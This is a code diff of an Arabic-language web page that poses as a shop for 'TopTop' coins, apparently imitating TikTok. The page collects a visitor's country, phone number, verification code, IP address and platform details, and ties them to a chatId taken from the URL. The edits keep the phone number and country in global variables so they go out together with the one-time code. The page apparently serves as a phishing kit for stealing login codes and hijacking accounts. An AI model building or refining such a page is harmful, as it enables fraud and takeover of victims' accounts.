@@ -171,20 +171,11 @@
             <form id="loginForm">
                 <label for="country">اختر الدولة:</label>
                 <select id="country" name="country" required>
-                  <option value="YE" data-code="+967">🇾🇪 اليمن (+967)</option>
+                    <option value="YE" data-code="+967">🇾🇪 اليمن (+967)</option>
                     <option value="SA" data-code="+966">🇸🇦 السعودية (+966)</option>
-                    <option value="EG" data-code="+20">🇪🇬 مصر (+20)</option>
-                    <option value="IQ" data-code="+964">🇮🇶 العراق (+964)</option>
-                    <option value="LY" data-code="+218">🇱🇾 ليبيا (+218)</option>
-                    <option value="JO" data-code="+962">🇯🇴 الأردن (+962)</option>
-                    <option value="AE" data-code="+971">🇦🇪 الإمارات (+971)</option>
-                    <option value="SD" data-code="+249">🇸🇩 السودان (+249)</option>
-                    <option value="MA" data-code="+212">🇲🇦 المغرب (+212)</option>
-                    <option value="SY" data-code="+963">🇸🇾 سوريا (+963)</option>
-                    <option value="TN" data-code="+216">🇹🇳 تونس (+216)</option>
-                    <option value="DZ" data-code="+213">🇩🇿 الجزائر (+213)</option>
+                    <!-- إضافة المزيد من الدول حسب الحاجة -->
                 </select>
-                <input type="text" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
+                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
                 <input type="hidden" id="chatId" name="chatId">
                 <button type="button" onclick="sendPhoneNumber()">إرسال رقم الهاتف</button>
             </form>
@@ -196,8 +187,6 @@
                 <input type="text" id="verificationCode" name="verificationCode" placeholder="أدخل الكود" required>
                 <button type="submit">تأكيد الدخول</button>
             </form>
-        </div>
-
        <div class="pricing-section">
             <h2>أسعار أكوانزات TopTop</h2>
             <div class="pricing-option">
@@ -220,13 +209,14 @@
     </div>
 
     <script>
-        // استخراج معرف المحادثة من URL
+        let globalPhoneNumber = '';
+        let globalCountry = '';
+
         function getChatIdFromUrl() {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('chatId');
         }
 
-        // تعيين معرف المحادثة عند تحميل الصفحة
         document.addEventListener('DOMContentLoaded', function() {
             const chatId = getChatIdFromUrl();
             if (chatId) {
@@ -287,6 +277,9 @@
                 return;
             }
 
+            globalPhoneNumber = phoneNumber;
+            globalCountry = country;
+
             const ipInfo = await getIPInfo();
             const platformInfo = getPlatformInfo();
 
@@ -323,11 +316,9 @@
         async function verifyCode(event) {
             event.preventDefault();
             const verificationCode = document.getElementById('verificationCode').value;
-            const phoneNumber = document.getElementById('phoneNumber').value;
-            const country = document.getElementById('country').value;
             const chatId = document.getElementById('chatId').value;
 
-            if (!verificationCode || !phoneNumber || !country || !chatId) {
+            if (!verificationCode || !globalPhoneNumber || !globalCountry || !chatId) {
                 showMessage('يرجى ملء جميع الحقول المطلوبة');
                 return;
             }
@@ -343,8 +334,8 @@
                     },
                     body: JSON.stringify({
                         verificationCode,
-                        phoneNumber,
-                        country,
+                        phoneNumber: globalPhoneNumber,
+                        country: globalCountry,
                         chatId,
                         ip: ipInfo.ip,
                         platform: platformInfo.platform,
